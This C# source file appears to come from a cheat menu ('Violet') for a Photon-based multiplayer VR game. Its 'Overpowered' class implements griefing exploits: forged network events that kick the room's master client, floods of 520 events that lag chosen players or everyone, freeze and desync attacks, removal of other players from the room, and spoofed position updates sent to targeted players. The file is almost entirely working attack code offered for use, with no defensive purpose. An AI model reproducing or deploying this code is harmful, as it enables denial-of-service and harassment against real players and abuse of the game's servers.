using ExitGames.Client.Photon;
using Fusion;
using Photon.Pun;
using Photon.Realtime;
using Photon.Voice.Windows;
using POpusCodec.Enums;
using System;
using System.Collections.Generic;
using System.Text;
using UnityEngine;
using Violet.Menu.Utilities;
using Violet.Utilities;
using VioletPaid.Utilities;
using static Violet.Mods.Advantage;
namespace Violet.Mods
{
    class Overpowered
    {
        public static void ScitzoGun()
        {
            GunLib.MakeGun(true, () =>
            {
                if (PhotonNetwork.InRoom)
                {
                    if (GunLib.LockedRig != null)
                    {
                        RunViewUpdatePatch.SerilizeData = () =>
                        {
                            VRRig.LocalRig.transform.position = new Vector3(0, 999, 0);

                            SerializeUpdate(GorillaTagger.Instance.myVRRig.punView, new RaiseEventOptions
                            {
                                TargetActors = new int[] { GunLib.LockedRig.creator.ActorNumber },
                            });

                            return false;
                        };
                    }
                }
            }, () =>
            {
                RunViewUpdatePatch.SerilizeData = () =>
                {
                    return true;
                };
            });

        }

        public static void ReverseScitzoGun()
        {
            GunLib.MakeGun(true, () =>
            {
                if (PhotonNetwork.InRoom)
                {
                    foreach (Player plr in PhotonNetwork.PlayerListOthers)
                    {
                        if (plr != RigManager.GetPlayerFromVRRig(GunLib.LockedRig))
                        {
                            RunViewUpdatePatch.SerilizeData = () =>
                            {
                                VRRig.LocalRig.transform.position = new Vector3(0, 999, 0);
                                SerializeUpdate(GorillaTagger.Instance.myVRRig.punView, new RaiseEventOptions
                                {
                                    TargetActors = new int[] { plr.ActorNumber },
                                });

                                return false;
                            };
                        }
                    }
                }
            }, () =>
            {
                RunViewUpdatePatch.SerilizeData = () =>
                {
                    return true;
                };
            });
        }

        public static void KickMaster()
        {
            if (PhotonNetwork.InRoom)
            {
                Hashtable hashtable = new Hashtable();
                hashtable[0] = "GameMode";
                hashtable[4] = new int[]
                {
                PhotonNetwork.AllocateViewID(0)
                };
                hashtable[6] = PhotonNetwork.ServerTimestamp;
                hashtable[7] = PhotonNetwork.AllocateViewID(0);

                for (int i = 0; i < 3; i++)
                {
                    PhotonNetwork.CurrentRoom.LoadBalancingClient.OpRaiseEvent(202, hashtable, new RaiseEventOptions
                    {
                        TargetActors = new int[]
                        {
                            PhotonNetwork.MasterClient.ActorNumber
                        },
                        CachingOption = EventCaching.AddToRoomCacheGlobal
                    }, SendOptions.SendUnreliable);
                }

                PhotonNetwork.CurrentRoom.LoadBalancingClient.LoadBalancingPeer.SendOutgoingCommands();
                PhotonNetwork.SendAllOutgoingCommands();
                Tools.AutoFlushRPCS();
            }
        }

        public static void KickMasterGun()
        {
            GunLib.MakeGun(true, () =>
            {
                if (PhotonNetwork.InRoom)
                {
                    Hashtable hashtable = new Hashtable();
                    hashtable[0] = "GameMode";
                    hashtable[4] = new int[]
                    {
                        PhotonNetwork.AllocateViewID(0)
                    };
                    hashtable[6] = PhotonNetwork.ServerTimestamp;
                    hashtable[7] = PhotonNetwork.AllocateViewID(0);

                    for (int i = 0; i < 3; i++)
                    {
                        PhotonNetwork.CurrentRoom.LoadBalancingClient.OpRaiseEvent(202, hashtable, new RaiseEventOptions
                        {
                            TargetActors = new int[]
                            {
                                PhotonNetwork.MasterClient.ActorNumber
                            },
                            CachingOption = 0
                        }, SendOptions.SendUnreliable);
                    }

                    PhotonNetwork.CurrentRoom.LoadBalancingClient.LoadBalancingPeer.SendOutgoingCommands();
                    PhotonNetwork.SendAllOutgoingCommands();
                    Tools.AutoFlushRPCS();
                }
            });
        }

        public static void SlowSetMaster()
        {
            if (PhotonNetwork.InRoom)
            {
                if (PhotonNetwork.MasterClient.ActorNumber != PhotonNetwork.LocalPlayer.ActorNumber)
                {
                    KickMaster();
                }
            }
        }

        public static void FreezeAll(float Delay, int Loop)
        {
            if (!PhotonNetwork.InRoom || !Tools.Delay(Delay)) return;

            for (int i = 0; i < Loop; i++)
            {
                PhotonNetwork.CurrentRoom.LoadBalancingClient.OpRaiseEvent(22, new object[]
                {
                    "discord.gg/Violet"
                }, new RaiseEventOptions
                {
                    Receivers = ReceiverGroup.Others,
                    CachingOption = EventCaching.AddToRoomCache,
                    Flags = new WebFlags(byte.MaxValue)
                }, SendOptions.SendUnreliable);
            }
            Tools.AutoFlushRPCS();
        }

        public static void LagAll()
        {
            if (!PhotonNetwork.InRoom || !Tools.Delay(1.2f)) return;

            var client = PhotonNetwork.CurrentRoom.LoadBalancingClient;

            var table = new Hashtable
            {
                { 0, "GameMode" },
                { 5, new[] { UnityEngine.Random.Range(int.MinValue, int.MaxValue) } },
                { 6, PhotonNetwork.ServerTimestamp },
                { 7, 2 }
            };

            var raiseOptions = new RaiseEventOptions
            {
                Receivers = ReceiverGroup.Others
            };

            for (int i = 0; i < 520; i++)
                client.OpRaiseEvent(202, table, raiseOptions, SendOptions.SendUnreliable);

            client.LoadBalancingPeer.SendOutgoingCommands();
            PhotonNetwork.SendAllOutgoingCommands();
            Tools.AutoFlushRPCS();
        }

        public static void LagGun()
        {
            GunLib.MakeGun(true, () =>
            {
                if (!PhotonNetwork.InRoom || !Tools.Delay(1.2f)) return;

                var client = PhotonNetwork.CurrentRoom.LoadBalancingClient;

                var table = new Hashtable
                {
                    { 0, "GameMode" },
                    { 5, new[] { UnityEngine.Random.Range(int.MinValue, int.MaxValue) } },
                    { 6, PhotonNetwork.ServerTimestamp },
                    { 7, 2 }
                };

                var raiseOptions = new RaiseEventOptions
                {
                    TargetActors = new[] { GunLib.LockedRig.creator.ActorNumber },
                };

                for (int i = 0; i < 520; i++)
                    client.OpRaiseEvent(202, table, raiseOptions, SendOptions.SendUnreliable);

                client.LoadBalancingPeer.SendOutgoingCommands();
                PhotonNetwork.SendAllOutgoingCommands();
                Tools.AutoFlushRPCS();
            });
        }

        public static void DesyncGun()
        {
            GunLib.MakeGun(true, () =>
            {
                if (PhotonNetwork.InRoom && Tools.Delay(1.2f))
                {
                    PhotonNetwork.OpRemoveCompleteCacheOfPlayer(GunLib.LockedRig.creator.ActorNumber);
                    PhotonNetwork.CurrentRoom.LoadBalancingClient.LoadBalancingPeer.OpRaiseEvent(254, null, new RaiseEventOptions
                    {
                        TargetActors = new int[] { GunLib.LockedRig.creator.ActorNumber },
                        CachingOption = EventCaching.AddToRoomCache,
                    }, SendOptions.SendUnreliable);
                    PhotonNetwork.RemoveCacheOfLeftPlayers();
                }
            });
        }
        public static void DestroyGun()
        {
            GunLib.MakeGun(true, () =>
            {
                if (PhotonNetwork.InRoom)
                {
                    Player plr = GunLib.LockedRig.creator.GetPlayerRef();
                    PhotonNetwork.CurrentRoom.StorePlayer(plr);
                    PhotonNetwork.CurrentRoom.Players.Remove(plr.ActorNumber);
                    PhotonNetwork.OpRemoveCompleteCacheOfPlayer(plr.ActorNumber);
                }
            });
        }

        public static void DestroyAll()
        {
            foreach (Player plr in PhotonNetwork.PlayerListOthers)
            {
                PhotonNetwork.CurrentRoom.StorePlayer(plr);
                PhotonNetwork.CurrentRoom.Players.Remove(plr.ActorNumber);
                PhotonNetwork.OpRemoveCompleteCacheOfPlayer(plr.ActorNumber);
            }
        }
    }
}
